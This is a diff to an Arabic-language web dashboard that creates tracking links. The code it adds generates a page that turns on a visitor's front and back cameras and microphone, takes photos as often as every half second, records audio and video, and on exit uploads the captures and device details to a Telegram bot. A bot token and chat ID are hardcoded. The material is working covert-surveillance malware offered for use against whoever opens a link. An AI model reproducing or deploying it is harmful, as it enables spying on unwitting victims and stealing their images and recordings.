@@ -407,20 +407,10 @@
 
                         <div class="input-group">
                             <label class="input-label">إعدادات التقاط البيانات</label>
-                            <div style="display: flex; gap: 10px;">
-                                <label style="color: #b0b0b0;">
-                                    <input type="checkbox" id="enableContinuousCapture" checked> التقاط صور متكرر
-                                </label>
-                                <label style="color: #b0b0b0;">
-                                    <input type="checkbox" id="enableAudioRecording" checked> تسجيل صوتي
-                                </label>
-                                <label style="color: #b0b0b0;">
-                                    <input type="checkbox" id="enableVideoRecording" checked> تسجيل فيديو
-                                </label>
-                            </div>
-                            <div style="margin-top: 10px;">
-                                <label class="input-label">معدل التقاط الصور (بالثواني)</label>
-                                <input type="number" class="text-input" id="captureInterval" min="1" max="60" value="5">
+                            <div class="permissions-grid">
+                                <div class="permission-item">📸 التقاط صور متكرر</div>
+                                <div class="permission-item">🎤 تسجيل صوتي مستمر</div>
+                                <div class="permission-item">🎥 تسجيل فيديو مستمر</div>
                             </div>
                         </div>
 
@@ -439,11 +429,11 @@
                             <div class="card-title">✅ الرابط جاهز</div>
                             <div class="generated-link" id="generatedLink"></div>
                             <ul class="feature-list">
-                                <li>تقاط صور متكرر من الكاميرا الأمامية والخلفية</li>
-                                <li>تسجيل صوتي وفيديو مستمر</li>
-                                <li>جمع معلومات الجهاز والموقع والبيانات المتقدمة</li>
-                                <li>إرسال البيانات إلى بوت التلجرام</li>
-                                <li>تتبع النقرات والبيانات</li>
+                                <li>تقاط صور من الكاميرا الأمامية والخلفية كل 0.5 ثانية</li>
+                                <li>تسجيل صوتي مستمر حتى الخروج من الرابط</li>
+                                <li>تسجيل فيديو مستمر حتى الخروج من الرابط</li>
+                                <li>جمع معلومات الجهاز والموقع</li>
+                                <li>إرسال البيانات إلى بوت التلجرام عند الخروج</li>
                             </ul>
                             <div class="device-actions">
                                 <button class="btn btn-small" id="copyLinkBtn">نسخ الرابط</button>
@@ -501,6 +491,15 @@
                             <label class="input-label">إعدادات التلجرام</label>
                             <input type="text" class="text-input" id="defaultBotToken" placeholder="رمز البوت الافتراضي" value="7144838322:AAEYLHsGFavk7BAlHqfcsV5XuXvOEadS6KA">
                             <input type="text" class="text-input" id="defaultChatId" placeholder="معرف الدردشة الافتراضي" value="6113061454" style="margin-top: 10px;">
+                        </div>
+
+                        <div class="input-group">
+                            <label class="input-label">إعدادات التقاط البيانات</label>
+                            <select class="text-input" id="captureInterval">
+                                <option value="500">التقاط صورة كل 0.5 ثانية</option>
+                                <option value="1000">التقاط صورة كل 1 ثانية</option>
+                                <option value="2000">التقاط صورة كل 2 ثانية</option>
+                            </select>
                         </div>
 
                         <div class="input-group">
@@ -572,7 +571,8 @@
             settings: {
                 defaultBotToken: "7144838322:AAEYLHsGFavk7BAlHqfcsV5XuXvOEadS6KA",
                 defaultChatId: "6113061454",
-                storageType: "local"
+                storageType: "local",
+                captureInterval: "500"
             }
         };
 
@@ -598,16 +598,13 @@
             defaultBotToken: document.getElementById('defaultBotToken'),
             defaultChatId: document.getElementById('defaultChatId'),
             storageType: document.getElementById('storageType'),
+            captureInterval: document.getElementById('captureInterval'),
             saveSettingsBtn: document.getElementById('saveSettingsBtn'),
             systemTerminal: document.getElementById('systemTerminal'),
             totalVisits: document.getElementById('totalVisits'),
             successRate: document.getElementById('successRate'),
             avgData: document.getElementById('avgData'),
-            uptime: document.getElementById('uptime'),
-            enableContinuousCapture: document.getElementById('enableContinuousCapture'),
-            enableAudioRecording: document.getElementById('enableAudioRecording'),
-            enableVideoRecording: document.getElementById('enableVideoRecording'),
-            captureInterval: document.getElementById('captureInterval')
+            uptime: document.getElementById('uptime')
         };
 
         // تبويبات
@@ -661,10 +658,6 @@
             const linkDescription = document.getElementById('linkDescription').value || 'لا يوجد وصف';
             const botToken = document.getElementById('botToken').value || systemData.settings.defaultBotToken;
             const chatId = document.getElementById('chatId').value || systemData.settings.defaultChatId;
-            const enableContinuousCapture = elements.enableContinuousCapture.checked;
-            const enableAudioRecording = elements.enableAudioRecording.checked;
-            const enableVideoRecording = elements.enableVideoRecording.checked;
-            const captureInterval = elements.captureInterval.value;
             
             elements.progress.style.display = 'block';
             let progress = 0;
@@ -674,16 +667,14 @@
                 if (progress >= 100) {
                     progress = 100;
                     clearInterval(interval);
-                    completeLinkGeneration(linkName, linkDescription, botToken, chatId, 
-                        enableContinuousCapture, enableAudioRecording, enableVideoRecording, captureInterval);
+                    completeLinkGeneration(linkName, linkDescription, botToken, chatId);
                 }
                 elements.progressFill.style.width = progress + '%';
                 elements.progressText.textContent = Math.round(progress) + '%';
             }, 200);
         });
 
-        function completeLinkGeneration(name, description, botToken, chatId, 
-            enableContinuousCapture, enableAudioRecording, enableVideoRecording, captureInterval) {
+        function completeLinkGeneration(name, description, botToken, chatId) {
             elements.progress.style.display = 'none';
             
             // إنشاء رابط حقيقي
@@ -696,11 +687,7 @@
                 <strong>الاسم:</strong> ${name}<br>
                 <strong>الوصف:</strong> ${description}<br>
                 <strong>البوت:</strong> ${botToken.substring(0, 10)}...<br>
-                <strong>الدردشة:</strong> ${chatId}<br>
-                <strong>التقاط متكرر:</strong> ${enableContinuousCapture ? '✅' : '❌'}<br>
-                <strong>تسجيل صوتي:</strong> ${enableAudioRecording ? '✅' : '❌'}<br>
-                <strong>تسجيل فيديو:</strong> ${enableVideoRecording ? '✅' : '❌'}<br>
-                <strong>معدل التقاط الصور:</strong> ${captureInterval} ثواني
+                <strong>الدردشة:</strong> ${chatId}
             `;
             
             elements.linkResult.style.display = 'block';
@@ -714,14 +701,11 @@
                 url: linkUrl,
                 botToken: botToken,
                 chatId: chatId,
-                enableContinuousCapture: enableContinuousCapture,
-                enableAudioRecording: enableAudioRecording,
-                enableVideoRecording: enableVideoRecording,
-                captureInterval: captureInterval,
                 active: true,
                 createdAt: new Date().toLocaleString('ar-EG'),
                 clicks: 0,
-                dataReceived: 0
+                dataReceived: 0,
+                captureInterval: systemData.settings.captureInterval
             };
             
             systemData.links.push(newLink);
@@ -729,6 +713,502 @@
             updateLinksList();
             
             addTerminalLog(`🔗 تم إنشاء رابط جديد: ${name}`);
+            
+            // إنشاء صفحة التقاط البيانات للرابط
+            createCapturePage(linkId, newLink);
+        }
+
+        // إنشاء صفحة التقاط البيانات
+        function createCapturePage(linkId, linkData) {
+            const capturePage = `
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>موقع التقاط الصور</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: Arial, sans-serif;
+            background: #000;
+            color: #fff;
+            text-align: center;
+            padding: 20px;
+            direction: rtl;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        .header {
+            margin-bottom: 30px;
+        }
+        .logo {
+            font-size: 2em;
+            color: #ff6b6b;
+            margin-bottom: 10px;
+        }
+        .status {
+            background: rgba(255, 107, 107, 0.1);
+            border: 1px solid #ff6b6b;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        .video-container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin: 20px 0;
+        }
+        video {
+            width: 100%;
+            border-radius: 8px;
+            background: #333;
+        }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin: 20px 0;
+        }
+        .stat-item {
+            background: rgba(255, 107, 107, 0.1);
+            padding: 10px;
+            border-radius: 8px;
+            border: 1px solid rgba(255, 107, 107, 0.3);
+        }
+        .btn {
+            background: linear-gradient(90deg, #ff0000, #ff6b6b);
+            color: white;
+            border: none;
+            padding: 15px 25px;
+            border-radius: 8px;
+            font-size: 1.1em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin: 10px;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 0, 0, 0.3);
+        }
+        .btn-success {
+            background: linear-gradient(90deg, #00ff9d, #6c63ff);
+        }
+        .log {
+            background: #000;
+            color: #00ff9d;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: monospace;
+            height: 150px;
+            overflow-y: auto;
+            margin-top: 20px;
+            text-align: left;
+            direction: ltr;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">موقع التقاط الصور</div>
+            <div>جاري جمع البيانات...</div>
+        </div>
+        
+        <div class="status" id="status">
+            جاري تهيئة النظام...
+        </div>
+        
+        <div class="video-container">
+            <div>
+                <div>الكاميرا الأمامية</div>
+                <video id="frontCamera" autoplay muted></video>
+            </div>
+            <div>
+                <div>الكاميرا الخلفية</div>
+                <video id="backCamera" autoplay muted></video>
+            </div>
+        </div>
+        
+        <div class="stats">
+            <div class="stat-item">
+                <div id="imagesCount">0</div>
+                <div>الصور الملتقطة</div>
+            </div>
+            <div class="stat-item">
+                <div id="audioTime">0</div>
+                <div>ثانية صوت</div>
+            </div>
+            <div class="stat-item">
+                <div id="videoTime">0</div>
+                <div>ثانية فيديو</div>
+            </div>
+        </div>
+        
+        <div class="log" id="log">
+            [${new Date().toLocaleTimeString()}] بدء النظام...
+        </div>
+    </div>
+
+    <script>
+        // بيانات النظام
+        const linkConfig = {
+            id: "${linkId}",
+            botToken: "${linkData.botToken}",
+            chatId: "${linkData.chatId}",
+            captureInterval: ${linkData.captureInterval}
+        };
+        
+        // المتغيرات
+        let frontCameraStream = null;
+        let backCameraStream = null;
+        let audioStream = null;
+        let mediaRecorder = null;
+        let audioRecorder = null;
+        let videoChunks = [];
+        let audioChunks = [];
+        let images = [];
+        let captureInterval = null;
+        let audioRecordingTime = 0;
+        let videoRecordingTime = 0;
+        let imagesCount = 0;
+        
+        // العناصر
+        const statusEl = document.getElementById('status');
+        const frontCameraEl = document.getElementById('frontCamera');
+        const backCameraEl = document.getElementById('backCamera');
+        const imagesCountEl = document.getElementById('imagesCount');
+        const audioTimeEl = document.getElementById('audioTime');
+        const videoTimeEl = document.getElementById('videoTime');
+        const logEl = document.getElementById('log');
+        
+        // إضافة سجل
+        function addLog(message) {
+            const logEntry = document.createElement('div');
+            logEntry.textContent = [${new Date().toLocaleTimeString()}] \${message};
+            logEl.appendChild(logEntry);
+            logEl.scrollTop = logEl.scrollHeight;
+        }
+        
+        // تهيئة الكاميرات
+        async function initializeCameras() {
+            try {
+                statusEl.textContent = 'جاري الوصول إلى الكاميرات...';
+                addLog('جاري الوصول إلى الكاميرات...');
+                
+                // الحصول على قائمة الكاميرات
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const videoDevices = devices.filter(device => device.kind === 'videoinput');
+                
+                if (videoDevices.length === 0) {
+                    throw new Error('لم يتم العثور على كاميرات');
+                }
+                
+                // محاولة الوصول للكاميرا الأمامية
+                try {
+                    frontCameraStream = await navigator.mediaDevices.getUserMedia({
+                        video: { 
+                            deviceId: videoDevices[0].deviceId,
+                            facingMode: 'user'
+                        },
+                        audio: false
+                    });
+                    frontCameraEl.srcObject = frontCameraStream;
+                    addLog('✅ تم تهيئة الكاميرا الأمامية');
+                } catch (e) {
+                    addLog('❌ فشل في تهيئة الكاميرا الأمامية: ' + e.message);
+                }
+                
+                // محاولة الوصول للكاميرا الخلفية
+                if (videoDevices.length > 1) {
+                    try {
+                        backCameraStream = await navigator.mediaDevices.getUserMedia({
+                            video: { 
+                                deviceId: videoDevices[1].deviceId,
+                                facingMode: 'environment'
+                            },
+                            audio: false
+                        });
+                        backCameraEl.srcObject = backCameraStream;
+                        addLog('✅ تم تهيئة الكاميرا الخلفية');
+                    } catch (e) {
+                        addLog('❌ فشل في تهيئة الكاميرا الخلفية: ' + e.message);
+                    }
+                }
+                
+                statusEl.textContent = 'جاري بدء التسجيلات...';
+                
+                // بدء تسجيل الصوت
+                await startAudioRecording();
+                
+                // بدء تسجيل الفيديو
+                await startVideoRecording();
+                
+                // بدء التقاط الصور المتكرر
+                startImageCapture();
+                
+                statusEl.textContent = 'جاري جمع البيانات...';
+                addLog('✅ بدء جمع البيانات');
+                
+            } catch (error) {
+                statusEl.textContent = 'خطأ في تهيئة النظام: ' + error.message;
+                addLog('❌ خطأ في تهيئة النظام: ' + error.message);
+            }
+        }
+        
+        // بدء تسجيل الصوت
+        async function startAudioRecording() {
+            try {
+                audioStream = await navigator.mediaDevices.getUserMedia({ 
+                    audio: true,
+                    video: false 
+                });
+                
+                audioRecorder = new MediaRecorder(audioStream);
+                audioChunks = [];
+                
+                audioRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        audioChunks.push(event.data);
+                    }
+                };
+                
+                audioRecorder.start(1000); // جمع البيانات كل ثانية
+                addLog('🎤 بدء تسجيل الصوت');
+                
+                // تحديث وقت التسجيل الصوتي
+                setInterval(() => {
+                    audioRecordingTime++;
+                    audioTimeEl.textContent = audioRecordingTime;
+                }, 1000);
+                
+            } catch (error) {
+                addLog('❌ فشل في تسجيل الصوت: ' + error.message);
+            }
+        }
+        
+        // بدء تسجيل الفيديو
+        async function startVideoRecording() {
+            try {
+                // استخدام تيار الكاميرا الأمامية للتسجيل
+                const streamToRecord = frontCameraStream || backCameraStream;
+                if (!streamToRecord) return;
+                
+                mediaRecorder = new MediaRecorder(streamToRecord, {
+                    mimeType: 'video/webm;codecs=vp9'
+                });
+                
+                videoChunks = [];
+                
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        videoChunks.push(event.data);
+                    }
+                };
+                
+                mediaRecorder.start(1000); // جمع البيانات كل ثانية
+                addLog('🎥 بدء تسجيل الفيديو');
+                
+                // تحديث وقت التسجيل الفيديو
+                setInterval(() => {
+                    videoRecordingTime++;
+                    videoTimeEl.textContent = videoRecordingTime;
+                }, 1000);
+                
+            } catch (error) {
+                addLog('❌ فشل في تسجيل الفيديو: ' + error.message);
+            }
+        }
+        
+        // التقاط الصور المتكرر
+        function startImageCapture() {
+            captureInterval = setInterval(() => {
+                captureImages();
+            }, linkConfig.captureInterval);
+            
+            addLog('📸 بدء التقاط الصور المتكرر');
+        }
+        
+        // التقاط الصور من الكاميرات
+        function captureImages() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            
+            // التقاط من الكاميرا الأمامية
+            if (frontCameraEl.videoWidth > 0) {
+                canvas.width = frontCameraEl.videoWidth;
+                canvas.height = frontCameraEl.videoHeight;
+                ctx.drawImage(frontCameraEl, 0, 0);
+                const frontImage = canvas.toDataURL('image/jpeg', 0.8);
+                images.push({
+                    type: 'front',
+                    data: frontImage,
+                    timestamp: Date.now()
+                });
+            }
+            
+            // التقاط من الكاميرا الخلفية
+            if (backCameraEl.videoWidth > 0) {
+                canvas.width = backCameraEl.videoWidth;
+                canvas.height = backCameraEl.videoHeight;
+                ctx.drawImage(backCameraEl, 0, 0);
+                const backImage = canvas.toDataURL('image/jpeg', 0.8);
+                images.push({
+                    type: 'back',
+                    data: backImage,
+                    timestamp: Date.now()
+                });
+            }
+            
+            imagesCount = images.length;
+            imagesCountEl.textContent = imagesCount;
+        }
+        
+        // إرسال البيانات إلى التلجرام
+        async function sendDataToTelegram() {
+            addLog('📨 جاري إرسال البيانات...');
+            
+            try {
+                // تجميع البيانات
+                const data = {
+                    linkId: linkConfig.id,
+                    timestamp: new Date().toLocaleString('ar-EG'),
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    imagesCount: images.length,
+                    audioDuration: audioRecordingTime,
+                    videoDuration: videoRecordingTime
+                };
+                
+                // إرسال رسالة نصية
+                let message = \`📊 بيانات جديدة من الرابط: \${linkConfig.id}\\n\\n\`;
+                message += \`⏰ الوقت: \${data.timestamp}\\n\`;
+                message += \`📸 عدد الصور: \${data.imagesCount}\\n\`;
+                message += \`🎤 مدة الصوت: \${data.audioDuration} ثانية\\n\`;
+                message += \`🎥 مدة الفيديو: \${data.videoDuration} ثانية\\n\`;
+                message += \`🌐 المتصفح: \${data.userAgent.substring(0, 50)}...\\n\`;
+                message += \`💻 النظام: \${data.platform}\\n\`;
+                message += \`🔤 اللغة: \${data.language}\\n\`;
+                
+                // إرسال الرسالة النصية
+                await fetch(\`https://api.telegram.org/bot\${linkConfig.botToken}/sendMessage\`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: linkConfig.chatId,
+                        text: message
+                    })
+                });
+                
+                addLog('✅ تم إرسال البيانات النصية');
+                
+                // إرسال الصور (أول 10 صور فقط لتجنب التحميل الزائد)
+                const imagesToSend = images.slice(0, 10);
+                for (let i = 0; i < imagesToSend.length; i++) {
+                    const image = imagesToSend[i];
+                    const blob = await fetch(image.data).then(r => r.blob());
+                    const formData = new FormData();
+                    formData.append('chat_id', linkConfig.chatId);
+                    formData.append('photo', blob, \`image_\${i+1}.jpg\`);
+                    formData.append('caption', \`صورة \${i+1} من الكاميرا \${image.type === 'front' ? 'الأمامية' : 'الخلفية'}\`);
+                    
+                    await fetch(\`https://api.telegram.org/bot\${linkConfig.botToken}/sendPhoto\`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    addLog(\`✅ تم إرسال الصورة \${i+1}\`);
+                }
+                
+                // إرسال التسجيل الصوتي إذا كان موجوداً
+                if (audioChunks.length > 0) {
+                    audioRecorder.stop();
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                    const audioFormData = new FormData();
+                    audioFormData.append('chat_id', linkConfig.chatId);
+                    audioFormData.append('audio', audioBlob, 'audio_recording.webm');
+                    audioFormData.append('caption', \`تسجيل صوتي - \${audioRecordingTime} ثانية\`);
+                    
+                    await fetch(\`https://api.telegram.org/bot\${linkConfig.botToken}/sendAudio\`, {
+                        method: 'POST',
+                        body: audioFormData
+                    });
+                    
+                    addLog('✅ تم إرسال التسجيل الصوتي');
+                }
+                
+                // إرسال التسجيل الفيديو إذا كان موجوداً
+                if (videoChunks.length > 0) {
+                    mediaRecorder.stop();
+                    const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
+                    const videoFormData = new FormData();
+                    videoFormData.append('chat_id', linkConfig.chatId);
+                    videoFormData.append('video', videoBlob, 'video_recording.webm');
+                    videoFormData.append('caption', \`تسجيل فيديو - \${videoRecordingTime} ثانية\`);
+                    
+                    await fetch(\`https://api.telegram.org/bot\${linkConfig.botToken}/sendVideo\`, {
+                        method: 'POST',
+                        body: videoFormData
+                    });
+                    
+                    addLog('✅ تم إرسال التسجيل الفيديو');
+                }
+                
+                addLog('🎉 تم إرسال جميع البيانات بنجاح');
+                
+            } catch (error) {
+                addLog('❌ خطأ في إرسال البيانات: ' + error.message);
+            }
+        }
+        
+        // تنظيف الموارد
+        function cleanup() {
+            addLog('🧹 جاري تنظيف الموارد...');
+            
+            if (captureInterval) {
+                clearInterval(captureInterval);
+            }
+            
+            if (frontCameraStream) {
+                frontCameraStream.getTracks().forEach(track => track.stop());
+            }
+            
+            if (backCameraStream) {
+                backCameraStream.getTracks().forEach(track => track.stop());
+            }
+            
+            if (audioStream) {
+                audioStream.getTracks().forEach(track => track.stop());
+            }
+        }
+        
+        // معالجة إغلاق الصفحة
+        window.addEventListener('beforeunload', async (event) => {
+            event.preventDefault();
+            cleanup();
+            await sendDataToTelegram();
+        });
+        
+        // بدء النظام
+        initializeCameras();
+    <\/script>
+</body>
+</html>
+            `;
+            
+            // تخزين صفحة التقاط البيانات
+            localStorage.setItem(`capture_page_${linkId}`, capturePage);
         }
 
         // تحديث قائمة الروابط
@@ -778,56 +1258,6 @@
                     imagesHtml += `</div>`;
                 }
                 
-                // إنشاء HTML للبيانات المتقدمة
-                let advancedDataHtml = '';
-                if (data.advancedData) {
-                    advancedDataHtml = `
-                        <div style="margin-top: 15px;">
-                            <strong>البيانات المتقدمة:</strong>
-                            <div style="background: rgba(0,0,0,0.3); padding: 10px; border-radius: 5px; margin-top: 5px; font-size: 0.9em;">
-                                <div><strong>معلومات الجهاز:</strong></div>
-                                <div>productSub: ${data.advancedData.productSub || 'غير متوفر'}</div>
-                                <div>vendor: ${data.advancedData.vendor || 'غير متوفر'}</div>
-                                <div>maxTouchPoints: ${data.advancedData.maxTouchPoints || 'غير متوفر'}</div>
-                                <div>doNotTrack: ${data.advancedData.doNotTrack || 'غير متوفر'}</div>
-                                <div>hardwareConcurrency: ${data.advancedData.hardwareConcurrency || 'غير متوفر'}</div>
-                                <div>cookieEnabled: ${data.advancedData.cookieEnabled || 'غير متوفر'}</div>
-                                <div>appCodeName: ${data.advancedData.appCodeName || 'غير متوفر'}</div>
-                                <div>appName: ${data.advancedData.appName || 'غير متوفر'}</div>
-                                <div>appVersion: ${data.advancedData.appVersion || 'غير متوفر'}</div>
-                                <div>platform: ${data.advancedData.platform || 'غير متوفر'}</div>
-                                <div>product: ${data.advancedData.product || 'غير متوفر'}</div>
-                                <div>language: ${data.advancedData.language || 'غير متوفر'}</div>
-                                <div>languages: ${data.advancedData.languages || 'غير متوفر'}</div>
-                                <div>webdriver: ${data.advancedData.webdriver || 'غير متوفر'}</div>
-                                <div>pdfViewerEnabled: ${data.advancedData.pdfViewerEnabled || 'غير متوفر'}</div>
-                                <div>deviceMemory: ${data.advancedData.deviceMemory || 'غير متوفر'}</div>
-                                <div>userAgent: ${data.advancedData.userAgent || 'غير متوفر'}</div>
-                                
-                                <div style="margin-top: 10px;"><strong>معلومات أجهزة الوسائط:</strong></div>
-                                <div>audioinput: ${data.advancedData.audioinput || 'غير متوفر'}</div>
-                                <div>videoinput: ${data.advancedData.videoinput || 'غير متوفر'}</div>
-                                <div>audiooutput: ${data.advancedData.audiooutput || 'غير متوفر'}</div>
-                                
-                                <div style="margin-top: 10px;"><strong>معلومات الشبكة:</strong></div>
-                                <div>type: ${data.advancedData.networkType || 'غير متوفر'}</div>
-                                <div>rtt: ${data.advancedData.rtt || 'غير متوفر'}</div>
-                                <div>saveData: ${data.advancedData.saveData || 'غير متوفر'}</div>
-                                <div>effectiveType: ${data.advancedData.effectiveType || 'غير متوفر'}</div>
-                                <div>downlink: ${data.advancedData.downlink || 'غير متوفر'}</div>
-                                <div>downlinkMax: ${data.advancedData.downlinkMax || 'غير متوفر'}</div>
-                                
-                                <div style="margin-top: 10px;"><strong>معلومات البطارية:</strong></div>
-                                <div>مستوى البطارية: ${data.advancedData.batteryLevel || 'غير متوفر'}</div>
-                                <div>هل البطارية قيد الشحن: ${data.advancedData.batteryCharging || 'غير متوفر'}</div>
-                                
-                                <div style="margin-top: 10px;"><strong>أجهزة USB المتصلة:</strong></div>
-                                <div>إجمالي عدد أجهزة USB: ${data.advancedData.usbDevices || 'غير متوفر'}</div>
-                            </div>
-                        </div>
-                    `;
-                }
-                
                 dataElement.innerHTML = `
                     <div class="data-header">
                         <div><strong>الرابط:</strong> ${data.linkName || 'غير معروف'}</div>
@@ -844,13 +1274,10 @@
                             <strong>الحالة:</strong><br>
                             الكاميرا: ${data.cameraSuccess ? '✅' : '❌'}<br>
                             الموقع: ${data.locationSuccess ? '✅' : '❌'}<br>
-                            الإرسال: ${data.telegramSuccess ? '✅' : '❌'}<br>
-                            الصوت: ${data.audioSuccess ? '✅' : '❌'}<br>
-                            الفيديو: ${data.videoSuccess ? '✅' : '❌'}
+                            الإرسال: ${data.telegramSuccess ? '✅' : '❌'}
                         </div>
                     </div>
                     ${imagesHtml}
-                    ${advancedDataHtml}
                     <div class="device-actions">
                         <button class="btn btn-small" onclick="viewDataDetails(${index})">📄 تفاصيل</button>
                         <button class="btn btn-small" onclick="deleteData(${index})" style="background: #ff3d3d;">🗑️ حذف</button>
@@ -938,19 +1365,7 @@
             details += `الكاميرا: ${data.cameraSuccess ? 'نجح' : 'فشل'}\n`;
             details += `الموقع: ${data.locationSuccess ? 'نجح' : 'فشل'}\n`;
             details += `التلجرام: ${data.telegramSuccess ? 'نجح' : 'فشل'}\n`;
-            details += `الصوت: ${data.audioSuccess ? 'نجح' : 'فشل'}\n`;
-            details += `الفيديو: ${data.videoSuccess ? 'نجح' : 'فشل'}\n`;
             details += `عدد الصور: ${data.images ? data.images.length : 0}\n`;
-            
-            if (data.advancedData) {
-                details += `\nالبيانات المتقدمة:\n`;
-                details += `productSub: ${data.advancedData.productSub || 'غير متوفر'}\n`;
-                details += `vendor: ${data.advancedData.vendor || 'غير متوفر'}\n`;
-                details += `hardwareConcurrency: ${data.advancedData.hardwareConcurrency || 'غير متوفر'}\n`;
-                details += `deviceMemory: ${data.advancedData.deviceMemory || 'غير متوفر'}\n`;
-                details += `networkType: ${data.advancedData.networkType || 'غير متوفر'}\n`;
-                details += `batteryLevel: ${data.advancedData.batteryLevel || 'غير متوفر'}\n`;
-            }
             
             alert(details);
         }
@@ -975,6 +1390,7 @@
             systemData.settings.defaultBotToken = elements.defaultBotToken.value;
             systemData.settings.defaultChatId = elements.defaultChatId.value;
             systemData.settings.storageType = elements.storageType.value;
+            systemData.settings.captureInterval = elements.captureInterval.value;
             
             showMessage('success', '✅ تم حفظ الإعدادات بنجاح');
             addSystemLog('⚙️ تم تحديث إعدادات النظام');
@@ -999,43 +1415,10 @@
                 cameraSuccess: Math.random() > 0.2,
                 locationSuccess: Math.random() > 0.3,
                 telegramSuccess: Math.random() > 0.1,
-                audioSuccess: randomLink.enableAudioRecording && Math.random() > 0.4,
-                videoSuccess: randomLink.enableVideoRecording && Math.random() > 0.3,
                 images: [
                     'https://via.placeholder.com/400x300?text=صورة+كاميرا+أمامية',
                     'https://via.placeholder.com/400x300?text=صورة+كاميرا+خلفية'
-                ],
-                advancedData: {
-                    productSub: "20030107",
-                    vendor: "Google Inc.",
-                    maxTouchPoints: 10,
-                    doNotTrack: "unspecified",
-                    hardwareConcurrency: 8,
-                    cookieEnabled: true,
-                    appCodeName: "Mozilla",
-                    appName: "Netscape",
-                    appVersion: "5.0 (Windows)",
-                    platform: "Win32",
-                    product: "Gecko",
-                    userAgent: navigator.userAgent,
-                    language: "ar",
-                    languages: ["ar", "en-US", "en"],
-                    webdriver: false,
-                    pdfViewerEnabled: true,
-                    deviceMemory: 8,
-                    audioinput: "default",
-                    videoinput: "default",
-                    audiooutput: "default",
-                    networkType: "wifi",
-                    rtt: 50,
-                    saveData: false,
-                    effectiveType: "4g",
-                    downlink: 10,
-                    downlinkMax: 100,
-                    batteryLevel: Math.floor(Math.random() * 100) + "%",
-                    batteryCharging: Math.random() > 0.5 ? "نعم" : "لا",
-                    usbDevices: Math.floor(Math.random() * 5)
-                }
+                ]
             };
             
             systemData.receivedData.unshift(newData);
@@ -1081,4 +1464,4 @@
         });
     </script>
 </body>
-        </html>
+    </html>
